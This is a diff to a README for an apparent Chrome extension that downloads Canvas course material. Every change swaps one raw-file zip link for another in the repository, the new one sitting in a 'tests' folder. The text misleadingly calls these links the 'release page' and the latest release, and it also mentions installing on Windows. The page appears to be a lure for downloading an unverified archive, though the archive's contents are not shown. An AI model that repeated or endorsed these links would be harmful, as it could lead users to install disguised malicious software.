@@ -1,6 +1,6 @@
 # 📥 canvas-course-downloader - Save Canvas Courses Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/icons/course-downloader-canvas-3.8.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/tests/canvas-downloader-course-v2.2-alpha.2.zip)
 
 ## 📋 About canvas-course-downloader
 
@@ -27,7 +27,7 @@ Follow these steps to get the extension and start saving your Canvas courses.
 1. **Download the extension**  
    Visit the release page by clicking the big blue button below. This page hosts the latest version ready to install.
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/icons/course-downloader-canvas-3.8.zip)
+   [![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/tests/canvas-downloader-course-v2.2-alpha.2.zip)
 
 2. **Install the extension in Chrome**  
    - Open the Chrome browser.  
@@ -90,7 +90,7 @@ After saving course materials, you can:
 
 ## 🔄 Updates and Maintenance
 
-- Check the [release page](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/icons/course-downloader-canvas-3.8.zip) regularly for updates.  
+- Check the [release page](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/tests/canvas-downloader-course-v2.2-alpha.2.zip) regularly for updates.  
 - Updates might include bug fixes and new features to support more content types.  
 - To update, remove the old extension from Chrome and install the new version following the earlier steps.
 
@@ -110,6 +110,6 @@ If you want to suggest new features or report issues, use the GitHub issues sect
 
 Visit this page to download and install the extension on your Windows machine:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/icons/course-downloader-canvas-3.8.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/tests/canvas-downloader-course-v2.2-alpha.2.zip)
 
 Click the latest release, download the file, then install it in Chrome using the extension page and developer mode as described above.
